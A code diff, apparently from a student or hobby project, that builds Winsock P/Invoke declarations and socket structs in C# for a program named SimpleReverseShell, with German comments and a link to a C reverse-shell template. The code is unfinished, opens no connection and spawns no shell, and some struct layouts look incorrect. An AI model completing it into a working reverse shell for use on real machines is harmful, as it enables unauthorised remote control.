@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 
 namespace SimpleReverseShell
 {
+  // Vorlage für diese Implementierung: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
   internal class SimpleSysCallShell
   {
     #region MemoryManagement
@@ -75,6 +76,7 @@ namespace SimpleReverseShell
     #region Sockets
     /// <summary>
     /// Importierte Methode um Socket zu erzeugen.
+    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
     /// </summary>
     /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
     /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
@@ -86,9 +88,20 @@ namespace SimpleReverseShell
     [DllImport("Ws2_32.dll")]
     public static extern SOCKET WSASocketA(int af, int type, int protocol, WSAPROTOCOL_INFOA protocolInfo, int group, int dwFlags);
 
+    /// <summary>
+    /// Importierte Methode um ein Socket zu connecten.
+    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
+    /// </summary>
+    /// <param name="socket">Das Socket.</param>
+    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
+    /// <param name="namelen">Länge der Sockaddr Struktur</param>
+    /// <returns></returns>
     [DllImport("Ws2_32.dll")]
-    public static extern int connect(SOCKET socket, IntPtr name, int namelen);
+    public static extern int connect(SOCKET socket, ref SockAddr name, int namelen);
 
+    /// <summary>
+    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa
+    /// </summary>
     [StructLayout(LayoutKind.Sequential)]
     internal struct WSAPROTOCOL_INFOA
     {
@@ -114,6 +127,9 @@ namespace SimpleReverseShell
       char szProtocol;
     }
 
+    /// <summary>
+    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocolchain
+    /// </summary>
     [StructLayout(LayoutKind.Sequential)]
     internal struct WSAPROTOCOLCHAIN
     {
@@ -121,6 +137,9 @@ namespace SimpleReverseShell
       int ChainEntries;
     }
 
+    /// <summary>
+    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-socket
+    /// </summary>
     [StructLayout(LayoutKind.Sequential)]
     internal struct SOCKET
     {
@@ -130,19 +149,38 @@ namespace SimpleReverseShell
     }
 
     /// <summary>
-    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
+    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2
     /// </summary>
     [StructLayout(LayoutKind.Sequential)]
     internal struct SockAddr_In
     {
-      ulong S_addr;
+      short s_family;
+      ushort s_port;
+      In_Addr s_addr;
+      char sin_zero;
     }
 
+    /// <summary>
+    /// Repräsentiert eine IPv4 Adresse.
+    /// Dokumentation hierzu: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
+    /// </summary>
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct In_Addr
+    {
+      byte s_b1;
+      byte s_b2;
+      byte s_b3;
+      byte s_b4;
+    }
+
+    /// <summary>
+    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2
+    /// </summary>
     [StructLayout(LayoutKind.Sequential)]
     internal struct SockAddr
     {
       ushort sa_family;
-
+      char sa_data;
     }
 
     /// <summary>
@@ -164,9 +202,7 @@ namespace SimpleReverseShell
     {
       var protcolInfo = new WSAPROTOCOL_INFOA();
       var socketAddress = new SocketAddress();
-      socketAddress.
       var socket = WSASocketA(2, 1, 6, protcolInfo, 0, 0);
-
     }
   }
 }
